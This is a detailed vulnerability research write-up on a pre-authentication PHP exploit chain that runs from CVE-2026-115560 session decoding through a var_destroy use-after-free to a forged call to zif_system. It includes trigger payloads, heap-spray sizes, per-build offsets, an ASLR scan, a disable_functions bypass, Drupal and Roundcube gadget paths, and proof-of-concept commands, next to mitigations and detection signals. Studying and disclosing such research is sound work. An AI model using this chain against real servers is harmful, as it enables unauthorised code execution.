# The session decoder was the sink all along

### CVE-2026-115560, `var_destroy`, and a forged `zif_system` on patched PHP

**Date:** 2026-10-31 · **Scope:** lab-only, `127.0.0.1` · **Proof command:** `id>/tmp/vd 2>&1` (fixed, benign) · **Status:** published with the research repository: <https://github.com/pax-k/php2shell-hunt>

> **Lab boundary.** Everything ran against local containers. Targets were
> `127.*`/`::1`; the only command executed was the fixed, benign
> `id>/tmp/vd 2>&1`; there is no arbitrary-command interface. This is a
> research record, not a tool.

---

## 1. A request that should not matter

Start with the least interesting request in PHP: a `multipart/form-data` POST
with a field named `PHP_SESSION_UPLOAD_PROGRESS`. The upload-progress hook
answers it before application code exists, writing a progress record so a
second request can poll it.

On a server configured with `session.serialize_handler = php_serialize`, the
hook writes that record with `php_serialize`. Now suppose the application calls:

```php
ini_set('session.serialize_handler', 'php');
session_start();
```

One serializer wrote the file; another reads it. `php` is the
legacy decoder, and it treats a `|` in a value as a record separator:
everything after the first `|` goes to `php_var_unserialize()`. The progress
value is attacker-controlled and written before authentication, before
routing, before any application `unserialize()` call. That is
CVE-2026-115560 — a pre-auth session-decode primitive.

The natural reading is "object injection at worst," and public PoCs did that
with a plain file-cache destructor: real, but the shallow end. The interesting
question is what happens when the bytes after the `|` are a *memory-safety
trigger* and the sink is PHP's own decoder. That chain needs no application
`unserialize()` and ran end to end on 8.4.27/8.5.12 — patched for recent CVEs,
unpatched for 115560 and the `var_destroy` UAF.

## 2. The bug that isn't the bug

Three settings interact: a configured `php_serialize`/`php_binary` writer, a
runtime switch to `php` before `session_start()`, and
`session.upload_progress.enabled = On`.

```text
Direct (cleanup=Off): one POST is both writer and consumer
POST /consumer  (unauthenticated, same request)
  └─ rfc1867 hook, before app code
       └─ session file, php_serialize:
            upload_progress_|a:1018:{ ... }        <- attacker bytes, verbatim
  └─ app: ini_set('session.serialize_handler','php')
       └─ session_start()
            └─ ps_srlzr_decode_php()
                 └─ php_var_unserialize("a:1018:{ ... }")

Default cleanup=On: the record is erased at MULTIPART_EVENT_END
POST /prime  (slow streaming body, holds the record in worker A)
GET  /consumer  (same SID, worker B, inside the window)
  └─ app: ini_set(...,'php'); session_start(); decode as above
```

`php_binary` is named by the advisory but is a poor carrier here: the progress
key is length-capped, and a filename-shaped route truncates at a NUL. The ~10 KB
payload needs `php_serialize`.

The shape is rare but real: Roundcube calls
`ini_set('session.serialize_handler','php')` for its `db`/`redis`/`memcache`
drivers (but those read their own store, not the progress file), CakePHP for
`cake`/`database` sessions, Drupal with one config line, and any site can pick
it up from a plugin or legacy include.

## 3. 1018 elements and a duplicate key

The trigger is older than 115560 and lives in `var_unserializer.re`:

```php
class T { public function __destruct() { @unserialize('i:0;'); } }

$p = 'a:1018:{' . str_repeat('i:0;N;', 1016)
   . 'i:99999;O:1:"T":0:{}'
   . 'i:99999;i:42;' . '}';
@unserialize($p);
```

The number is not decorative. The parser's bookkeeping chain is a linked list
of `var_entries` blocks:

```c
struct var_entries {
    zend_long used_slots;
    void *next;
    zval *data[1018];      /* 8-byte slots, not inline zvals */
};
```

`16 + 8 * 1018` is 8160 bytes — two ZendMM pages. With 1017 elements the
extension block is never freed and the nested read finds live memory. At 1018
`var_destroy()` frees the chain, then walks the delayed-destructor list:

```c
while (var_hash) {                    /* free every var_entries chunk */
    next = var_hash->next;
    efree_size(var_hash, sizeof(var_entries));
    var_hash = next;
}
while (var_dtor_hash) {
    /* __wakeup / __unserialize branches take BG(serialize_lock) here */
    i_zval_ptr_dtor(zv);              /* __destruct: UNLOCKED */
}
```

The object's `__destruct()` calls `unserialize()` again. The nested call enters
`php_var_unserialize_init()` while the outer level is still non-zero and the
lock is zero, so it reuses `BG(unserialize).data` — the chain just freed — and
reads `(*var_hash)->last->used_slots` from freed memory. On ASAN:

```text
ERROR: AddressSanitizer: heap-use-after-free ... READ of size 8
    #0 php_var_unserialize        var_unserializer.c:906
    #13 var_destroy               var_unserializer.c:319
    #15 ps_srlzr_decode_php       session.c:1176
    #16 php_session_decode        session.c:279
    #17 php_session_initialize    session.c:506
    #18 php_session_start         session.c:1753
```

The bottom frame is `session_start()`, with no application frame because no
application called `unserialize()`. That is what separates this from the usual
gadget hunt.

The duplicate key is the other half. `var_push_dtor_value()` enqueues a value
only when it is *overwritten* (duplicate key or property). The payload puts the
gadget at the first `i:99999`, overwrites it with `i:42`, and the destructor
lands on the delayed list.

## 4. Why `__wakeup` and `__unserialize` do not work

`__wakeup` and `__unserialize` look ideal: they run at the right moment, and
gadget chains are full of them. On paper, a class whose `__wakeup()` calls
`unserialize($this->p)` looks like a re-entry.

It is not. Both magic branches in `var_destroy()` hold `BG(serialize_lock)`
across the call, so the nested `unserialize()` takes the *fresh* context
branch, gets an empty `var_hash`, and an out-of-range `R:1020;` returns `false`.
Nothing reads the freed chain.

We measured it: 8/8 combinations on 8.4.27 and 8.5.12 — `__wakeup` and
`__unserialize`, duplicate and non-duplicate placement. The magic method *was*
invoked from `var_destroy()` every time, sprayed, then logged
`after-unserialize type=boolean`; no proof was written. The positive control —
same carrier, same `zif_system`, a `__destruct` gadget — fired immediately on
both builds. Only the lock semantics differed.

A second trap: a *throwing* `__wakeup`/`__unserialize` sets
`IS_OBJ_DESTRUCTOR_CALLED`, and the later `__destruct` is suppressed. That is
why `FnStream` chains die under a real `unserialize()` sink even when the graph
looks perfect: psr7's `FnStream::__wakeup()` throws.

The usable shape is therefore narrow:

```php
class Gadget {
    public $p;
    public function __destruct() {
        // spray a same-size allocation here, then:
        @unserialize($this->p);
    }
}
```

A class with both a non-throwing `__unserialize()` and a `__destruct()` works
only via the destructor, at the overwritten placement. The bottleneck is a
destructor that sprays and re-enters `unserialize()`, not any magic method —
rarer than the public simple gadget.

## 5. From a read to a call: carrier, spray, forged `zif_system`

A UAF read is not RCE; the path is placement.

**The carrier is the raw session input buffer.** The payload is not the
`s:4096` string copy: that is freed when the first duplicate `i:0` is parsed,
long before the destructor at `i:99999`. What survives is the raw input buffer
after the `|` the decoder is still parsing; the scanner checks that
`a:1018:{i:0;s:4096:"` precedes the blob. On this shape,
`address(value) - main = 0x6c019` — per shape, not universal.

**The spray must land on the freed chunk.** The re-entrant `R:1020;` walks into
whatever occupies the 8160-byte address now, and the first 8 bytes at `data[1]`
become a `zval *`. The destructor allocates same-size strings first. On 8.4.27
a 3048-byte string (`3048 + 24 + 1 = 3073`, one page) can start exactly at the
page-aligned chunk base; at 8135 the allocator coalesces/splits so the base
lands before it, and the re-entry reads `0x41…` and crashes. On 8.5.12 the
working size is 8135 (a 8160-byte allocation, two pages).

Uppercase `R:` is required. Lowercase `r:` takes `var_push`, which writes at a
`used_slots` value read from the reclaimed string header — a wild write, not
the controlled read.

**The forged object** is built from fake engine structures in the reclaimed
chunk:

```text
reclaimed var_entries->data[1]
  └─ zval (IS_REFERENCE)
       └─ zend_reference (refcount 0)
            └─ zval (IS_OBJECT)
                 └─ zend_object  (also laid out as zend_execute_data)
                      └─ handlers->dtor_obj = zif_system
```

Dropping the reference runs `zend_reference_destroy()` →
`i_zval_ptr_dtor()` → `zend_objects_store_del()` → an indirect call through
`dtor_obj`. Because the object is also a plausible `zend_execute_data`, the
call reaches `zif_system` with a usable argument.

| build | carrier delta | spray | `lib − main` | `zif_system` offset |
|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `3048` | `+0x2130000` | `0x431510` |
| 8.5.12 | `0x6c019` | `8135` | `-0x3600000` | `0x535490` |

Reference id `1020`; fresh SID per request; `/prime.php` writes a second record
on 8.4.27 so the real decode-failure destructor (`inv=2`) runs instead of the
dry one (`inv=1`). Observable: `main=0xffff9ee00000`,
`carrier=0xffff9ee7b02d`, `proof='uid=33(www-data) ...'`. `response=<none>` is
expected — the forged call corrupts the request, so the proof file is the
evidence.

## 6. The default is `cleanup=On`

Everything above used `session.upload_progress.cleanup = Off`, a lab
convenience and a legitimate criticism. The default is `On`, and a real target
erases the record when the upload finishes — at `MULTIPART_EVENT_END`, when the
final boundary arrives. A slow upload leaves a window:

A streaming multipart POST sends the progress value `"|" + payload`, then eight
64 KiB chunks, 0.6 s apart — about a 4.8 s window. At `settle = 0.7 s`, a
concurrent GET with the same `PHPSESSID` hits the consumer, switches to `php`,
and calls `session_start()` while the record is live.

Two deployment facts make or break this: the pool needs **more than one prefork
child** (the upload occupies one worker, the consumer must run in another), and
the consumer must not run inside the upload request.

There is also a record-count requirement. Under `cleanup=On`, the
`/prime.php` dummy is erased at the end of its own upload, leaving `a:0:{}`.
The 8.4.27 path needs a *first* record so the real destructor is the second
one; a persistent `/seed.php` supplies it as
`$_SESSION['seed_d'] = '|' . <valid a:1018 dummy>`.

The file begins `a:1:{s:6:"seed_d";s:N:"|a:1018:{...`. The `php` decoder
ignores bytes before the first `|`, parses the dummy as record #1, then the
exploit as record #2. No seed, and only the dry `inv=1` destructor exists.

| build | race delta | outcome |
|---|---|---|
| 8.4.27 | `0x6d875` | `uid=33`, `inv=1 skip-first` / `inv=2 spray-done ref=1020 fire-end` |
| 8.5.12 | `0x80875` | `uid=33`, same destructor shape |

Controls: `settle=6.0` finds only the dry destructor; a different `PHPSESSID`
never reaches it; `--no-seed` leaves one record; `--bias-zif 0x1000` reaches the
real destructor, sprays, re-enters, and writes nothing.

Two failure modes are environmental. Docker without `platform: linux/arm64`
silently pulled amd64 under emulation, and the first measurement after a
restart drifted by `+0x1e000..0x20000`; the driver re-measures after a miss.

## 7. No `/proc`, on arm64

Reading `/proc/<pid>/mem` is a lab crutch and a poor claim for "remote," so the
chain fires without `/proc`.

On arm64 with `vm.mmap_rnd_bits = 18`, the ZendMM `main` chunk has nine bits of
entropy: 512 possible 2 MiB slots across `0xFFFF78000000..0xFFFFC0000000` (576
candidates at `0x200000` steps). A wrong guess kills a child; the parent
respawns. The pool shares a fork-inherited `main`, so one correct slot works for
every child. Each attempt uses a fresh SID and a `/prime.php` dummy.

```text
8.5.12  FOUND after 351 attempts (1406 s)
        main=0xffffa3c00000 carrier=0xffffa3c6c02d
        zif=0xffffa0b35490 -> uid=33

8.4.27  FOUND after 307 attempts (1238.8 s)
        main=0xffff9e400000 carrier=0xffff9e46c02d
        zif=0xffffa0961510 -> uid=33
```

(Exact-main check: 1 attempt, 1.8 s.)

The no-`/proc` result is **arm64-specific** and depends on 18-bit
`mmap_rnd_bits`. Native x86-64 at 28 bits is roughly `2^19` and needs a leak,
not a scan. amd64 under Rosetta works with explicit addresses (`main =
0x7ffffc400000`, `lib = 0x7ffffe007000`, `lib − main = 0x1c07000`, `zif_off =
0x46ad70`), but that is emulated userspace with a deterministic seed. The stock
maps parser needed an amd64-aware probe too: libphp's `r-xp` starts at file
offset `0x157000`, and `main` begins one page before the 2 MiB boundary.

## 8. `disable_functions` is not a wall

A hardened target typically sets
`disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec`.
On 8.4.27 that is real: `function_exists('system')` is `false`, and a direct
call is fatal.

The public 115560 simple-gadget path looks `system` up through the function
table, where `disable_functions` installs a stub. It is blocked. The forged
chain does not use the table: `handlers->dtor_obj` is an address inside
`libphp.so`, so the engine makes an indirect C call. On the hardened container
at `:18203`:

```text
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> var_destroy -> uid=33
```

Control `--bias-zif 0x1000` produced no proof, and the file had been removed
first. Not a new technique: TheCyberGeek, Qi Deng/`ikow`, and ACD421 published
it; new here is only the 115560 delivery with no application sink.

## 9. Real applications, part 1: Drupal 11 core P5

A lab class proves mechanics, not an application path. The survey
asked whether stock code, autoloadable before `session_start()`, has a
`__destruct()` that calls `unserialize()` on attacker data and discards the
result. Across ~46,500 files in ~60 trees, one answer: Drupal 11 core.

```text
YamlCacheCollectorDiscovery::__destruct()   Discovery/YamlCacheCollectorDiscovery.php:64
 -> MenuActiveTrail::destruct()             Menu/MenuActiveTrail.php:81
 -> CacheCollector::updateCache()           Cache/CacheCollector.php:234
      $lock_name = $cid . ':' . __CLASS__  :251   <- the spray
 -> MemoryBackend::get()                    Cache/MemoryBackend.php:44
 -> MemoryBackend::prepareItem()            :89
      $prepared->data = unserialize($prepared->data)   :99   <- re-entry
```

Pure core; builds its own spray; not suppressed by a throwing wakeup. Present
in 11.4.0-rc1+, absent in 11.0–11.3 and 10.4.x. Delivered through the real
decoder — `php_serialize` record, then `session_start()` with `php` — on stock
ZendMM.

`var_entries` is 8160 bytes; the lock name is `$cid . ':' .
'Drupal\Core\Cache\CacheCollector'`. At `strlen($cid) = 8102` it is 8135
bytes, and `zend_string_alloc` requests `24 + 8135 + 1 = 8160` — same size
class. `$cid[0:8]` carries the forged `zval *` to chunk+24 = `data[1]`.

One allocation is not enough: ZendMM best-fit takes the lowest exact two-page
free run, and lower runs survive `var_destroy`. `npad = 4` places four
8135-byte strings in a property parsed *last*, occupying those runs; `nk = 65`
string-keyed entries make `$data` a live two-page hashtable that consumes the
last one. Integer keys give a packed array that is never two pages.

GDB confirmed it: `FREED 0xfffff5f17000 -> emalloc 8128 -> erealloc 8167 ->
SUCCESS`.

| build | port | `main` | `zif` | delta | proof |
|---|---|---|---|---|---|
| 8.4.27 | `18300` | `0xffff9ee00000` | `0xffffa1401510` | `0x7b019` | `uid=33` |
| 8.5.12 | `18301` | `0xffff82000000` | `0xffff7ef35490` | `0x7b019` | `uid=33` |

`--cid-len 100` and `--bias-zif 0x1000` both failed with `nk=65, npad=4`
intact, so the negative is the removed spray or wrong pointer, not a different
heap. A consumer without the `class_exists()` preload still reaches `uid=33`:
Composer resolves P5 during decode. The `cleanup=On` race also lands on 8.4.27
(`delta=0x7b875`, multi-child, `vd_seed.php`); `--settle 6.0`, `--no-seed`, and
`--bias-zif` are negative.

**The caveat is structural.** Drupal's default session options do not set
`serialize_handler`; this chain needs `serialize_handler: php` in
`services.yml`, one non-default line. It is *config-gated*; without it the
gadget has no 115560 sink.

## 10. Real applications, part 2: Roundcube 1.6.11

Roundcube is the mirror image: the best precondition, no stock re-entry
gadget.

Plugins load at `rcmail.php:111`, `session_init()` is called at `:116`, and
plugin files are `include`d at load time, so their top-level code runs before
`session_start()`. `rcube_session::register_session_handler()`
(`rcube_session.php:109-116`) then runs `ini_set('session.serialize_handler',
'php')`. A log line proves the order: `simple-dtor` appears after
`handler-switched` and before `plugin-init`, with `proof: uid=33`.

Then the blocker: `register_session_handler()` is called only by the `db`,
`redis`, `memcache`, and `memcached` drivers; native `session/php.php` does not
call it, and there is no `'files'` option in 1.6.11. So `'db'` reads its own
table and never decodes the progress **file** (reproduced with SQLite: the row
held `temp|b:1;language|s:5:"en_US";...`, no `upload_progress` bytes), while
`'php'` reads the file but never switches the handler.

The two halves are mutually exclusive in stock 1.6.11. The lab result is
**plugin-assisted**: a plugin performs the switch after plugin load and before
`session_init()`, while `session_storage = 'php'` reads the hook's file. Both
the simple gadget and the var_destroy terminal then reproduce on 8.4.27
(`:18310`, `delta=0x8d9c1`) and 8.5.12 (`:18311`, `delta=0x9e9c1`), proof
`uid=33`; `--bias-zif`, `--noswitch`, and `--nogadget` are negative.

The write is visible as `s:10294:"upload_progress_|a:1018:{i:0;s:4096:"...`.
The correct carrier is not the first magic hit: the file is read more than
once, so the driver selects hits preceded by `upload_progress_|` and takes the
**highest-address** candidate (8.4.27: `0x799c1`, `0x80029`, `0x8d9c1`; the
lowest is released before the real destructor). Measure and fire need different
SIDs, or the extra progress key moves the carrier.

No stock class with the discard-shape destructor was found, and
`Crypt_GPG_Engine` (CVE-2025-49113) is a command-execution destructor, not a
re-entry. A Redis layout where the server save handler and Roundcube's driver
meet is possible in principle but was **not tested and is not claimed**.

## 11. The novelty reality check

The internal claim was that nobody had published the composition where the
session decoder itself is the `var_destroy` sink. That was wrong, and the
correction belongs in the record.

`ACD421/PHP` published the exact four-stage chain in
`weapons/lab/fa_jammy.sh` on 2026-10-26: upload-progress session wipe, handler
mismatch, victim decode, `Stage1::__destruct`, `dtor_obj = zif_system`, `id` on
jammy PHP 8.1.2 with ASLR on and no gdb. Its `zero1_session_gaps/WRITEUP.md`
(2026-10-21) publishes the 115560-class injection *and* the stock `cleanup=1`
slow-upload race on 8.5.12; `zero4`/`zero5` publish the re-entry and forged
terminal; `zero10` the slow-bleed mechanics.

So: not a new composition (including "no application `unserialize()` sink"),
CVE (115560 is assigned; the UAF has been public since May 2026, and PHP does
not issue CVEs for this class), lock correction, `disable_functions` bypass,
pinning technique, or no-`/proc` idea. ACD421, TheCyberGeek, Qi Deng/`ikow`,
devploit, 9bie, and umair-aziz025 published those.

What survived is narrower and therefore defensible: patched 8.4.27/8.5.12
pre-auth end to end; the default `cleanup=On` race combined with the
`var_destroy` terminal (including the two-record seed and the dry/real
destructor split); the arm64 no-`/proc` full-window result; the raw-session
carrier and per-build constants; and two real-app profiles, correctly labelled
config-gated (Drupal) and plugin-assisted (Roundcube).

That is an engineering/port result on a public composition — not "first,"
"default PHP," or a new class of attack. The plan's "carrier remains embargoed"
implied novelty; only placement, constants, seed timing, and the arm64 profile
were non-public. Those lower reproduction cost; they are not a vulnerability.

## 12. What actually helps defenders

Verified non-mitigations first: `disable_functions` stops the public simple
gadget but not the forged indirect call; application `unserialize()` hardening
is irrelevant when there is no application call; and a WAF rule aimed only at
the `a:1018` shape does not cover the public simple-gadget path.

What removes the precondition, in order of directness:

1. **Disable upload progress** — `session.upload_progress.enabled = 0` removes
   the writer that puts attacker bytes in the file before app code runs.
2. **Remove the runtime switch** — no `ini_set()` to `php`, and no
   `serialize_handler => php` option, on a server configured for
   `php_serialize`/`php_binary`.
3. **Pin the handler with `php_admin_value`**, e.g.
   `php_admin_value[session.serialize_handler] = php_serialize`. The runtime
   `ini_set()` then fails; `php_value` does **not** block it.
4. **Use one consistent handler**, eliminating paths that switch to `php` for
   the same session; the mismatch is the enabling condition.
5. **Keep session files outside the web root**, and **track the `var_destroy`
   UAF separately** — the former blocks inclusion variants, the latter
   survives the 109618/109619 patch on these builds.

Candidate signals — *not* validated rules — include a record with
`upload_progress_` and a long `a:1018:{...}` array with duplicate `i:99999`
keys; streaming uploads read concurrently on one SID; a handler change from
`php_serialize` to `php`; workers dying in `session_start()` (a symptom).

## 13. How this was disclosed

Five rules govern every claim in this write-up. The repository is the exact
example, not a summary of one.

1. **A candidate is not a finding until a lab command shows it.** Each claim has
   a `poc/verify_*` driver, a `lab-*/setup.sh` that rebuilds the environment, and
   a quoted receipt. The per-artifact audit trail is
   [`../RELEASE_MANIFEST.md`](../RELEASE_MANIFEST.md).
2. **Read evidence and executed evidence stay separate.** ASAN says the edge
   exists; the lab run says it fires. Where only the first exists, the chain is
   labelled accordingly.
3. **Controls travel with the claim.** Patched-build negative, `+0x1000` bias,
   `allowed_classes=false`, gadget removal. A result without a negative is a
   hypothesis, and the non-mitigations are published beside the mitigations.
4. **Credit prior art in the same paragraph as the claim, and ship the
   retraction.** Section 11 retracts an internal novelty claim instead of quietly
   editing it away; the full correction record is
   [`../NOVELTY_115560_2026-10-31.md`](../NOVELTY_115560_2026-10-31.md).
5. **Hold what is not public yet.** One current finding is withheld pending
   vendor contact and is not described anywhere in this repository. The hold, the
   reason, and the release condition are recorded in
   [`../RESPONSIBLE_PUBLICATION.md`](../RESPONSIBLE_PUBLICATION.md).

Why publish this one rather than hold it: the four-stage composition was already
public as working code (`ACD421/PHP`, `zero1` and `fa_jammy.sh`), the
`var_destroy` UAF has been public since May 2026, and independent 115560 PoCs
exist. Withholding a port of public work protects nobody, while the parts that
are ours — the patched-build and arm64 result, the control matrix, the measured
constants, and the negative results — are more useful published and falsifiable
than held.

The negative results are part of the disclosure discipline, not an
embarrassment: 8.2/8.3/8.5 fail at the leak shape, the FPM in-band leak is
unsolved, native x86-64 at `mmap_rnd_bits=28` needs an external seed, and a
4.1M-execution ASAN campaign over `unserialize()`/`session_decode()` found no
generic in-band seed. A record that only listed wins would misrepresent the state
of the art.

Corrections to any analysis here are welcome as repository issues. Corrections
that require exploit traffic against third-party systems are not.

## 14. Closing lessons

**The sink is often not where the application looks.** Every "fix
`unserialize()`" control operates above this chain; the decoder sits inside
`session_start()`, on pre-auth bytes.

**Magic methods are not interchangeable.** The lock semantics make `__wakeup`
and `__unserialize` useless for re-entry and `__destruct` the only way in. We
lost real time to the opposite assumption; the fix was eight negative runs and
a positive control.

**Deployment knobs and labels decide the claim.** `cleanup`, prefork count,
`php_admin_value` vs `php_value`, and plugin load order matter more than payload
elegance. "Pre-auth on patched 8.4.27/8.5.12, arm64 no-`/proc`, config-gated
Drupal, plugin-assisted Roundcube" is actionable; "universal PHP RCE" is not.

**Do the novelty check before the write-up.** The most valuable document here
may be the one saying the composition was already public. A retraction costs a
paragraph; an overclaim costs the whole result.

## 15. Reproduce it, carefully

Everything is local and containerised. The full tree, including the verifiers
and every lab, is at <https://github.com/pax-k/php2shell-hunt>:

```sh
cd lab-115560 && docker compose up -d && cd ..
python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18200 \
  --container php2shell-115560-8427 --build 8.4.27 run
```

The reproducing code, by claim:

| Claim | Code | Command |
|---|---|---|
| 115560 → `var_destroy` → terminal | [`poc/verify_115560_vardestroy.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_vardestroy.py) | `--build 8.4.27 run` |
| default `cleanup=On` race | [`poc/verify_115560_race.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_race.py) | `--settle 0.7 --attempts 3` |
| Drupal 11.4.11 P5 profile | [`poc/verify_115560_drupal.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_drupal.py) | profile-specific delta |
| Roundcube 1.6.11 profile | [`poc/verify_115560_roundcube.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_roundcube.py) | plugin-assisted |
| `__wakeup` / `__unserialize` negatives | [`poc/verify_115560_wakeup.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_wakeup.py) | expected negative |
| ASAN UAF, minimal payload | [`poc/verify_var_destroy_uaf.php`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_var_destroy_uaf.php) | `php -d ...` under ASAN |
| reclaim → forged object → `zif_system` | [`poc/verify_vardestroy_rce.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_rce.py) | stock ZendMM |
| arm64 18-bit scan / GH-22554 seed / LFI front-ends | [`verify_vardestroy_bruteforce.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_bruteforce.py), [`verify_vardestroy_xpathleak.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_xpathleak.py), [`verify_vardestroy_lfi.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_lfi.py) | one front-end each |
| 8.4 series positive / negative / bias | [`poc/verify_matrix.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_matrix.py) | six builds |
| lab bring-up | [`lab-115560/docker-compose.yml`](https://github.com/pax-k/php2shell-hunt/blob/main/lab-115560/docker-compose.yml) | loopback only |

Every one of those files is the version that produced the receipts quoted above;
the per-command outputs are in
[`EVIDENCE_AND_CREDITS_115560.md`](./EVIDENCE_AND_CREDITS_115560.md).

The race uses `poc/verify_115560_race.py` on `:18204` with `--settle 0.7
--attempts 3`; Drupal and Roundcube have their own drivers and constants. Do
not reuse the direct delta across them: the request shape changes the carrier
placement, and a wrong delta produces a crash with no proof — which looks like a
chain failure but is a measurement failure.

Frozen evidence is in [`../PHASE0_115560_FREEZE.md`](../PHASE0_115560_FREEZE.md).
The full technical write-up is
[`SECURITY_REPORT_115560.md`](./SECURITY_REPORT_115560.md); reproduction
commands, constants, the control matrix, prior art, and credits are in
[`EVIDENCE_AND_CREDITS_115560.md`](./EVIDENCE_AND_CREDITS_115560.md); the
package index is [`README.md`](./README.md). Supporting docs:
[`../DRUPAL_115560.md`](../DRUPAL_115560.md),
[`../ROUNDCUBE_115560.md`](../ROUNDCUBE_115560.md),
[`../RACE_WAKEUP_115560.md`](../RACE_WAKEUP_115560.md),
[`../VAR_DESTROY_UAF.md`](../VAR_DESTROY_UAF.md), and
[`../NOVELTY_115560_2026-10-31.md`](../NOVELTY_115560_2026-10-31.md).

### The caveats, in one place

- **Not default PHP.** The default handler is `php`; 115560 needs
  `php_serialize`/`php_binary` configured *and* a runtime switch.
- **Not a default application.** Drupal needs one non-default config line;
  Roundcube needs a plugin supplying the switch.
- **A re-entry destructor is required** — a plain `shell_exec` destructor is
  enough only for the public simple-gadget path.
- **The race needs a live window and a second worker**; a target that buffers
  the whole body, or runs one worker, is out of scope.
- **No-`/proc` is arm64-specific** (18-bit `mmap_rnd_bits`); amd64/Rosetta is
  deterministic with explicit addresses; native x86-64 needs a leak.
- **Constants are per request shape and per build**; a rebuilt container can
  drift on cold start.
- **The terminal carries a fixed benign command**; the lab proves execution as
  the web user and exposes no command interface.
- **The composition is public.** ACD421's `fa_jammy.sh` (2026-10-26) and
  `zero1` (2026-10-21) precede it; B63, googlesky, mnk-works, TheCyberGeek,
  Qi Deng/`ikow`, dinosn, Calif, 9bie, devploit, and umair-aziz025 published
  the primitives. None of it is claimed.

What is left is a reproducible, patched-build, default-cleanup,
no-`/proc`-at-fire result — and a reminder that the most dangerous
`unserialize()` in a PHP application may be the one the application never
calls.



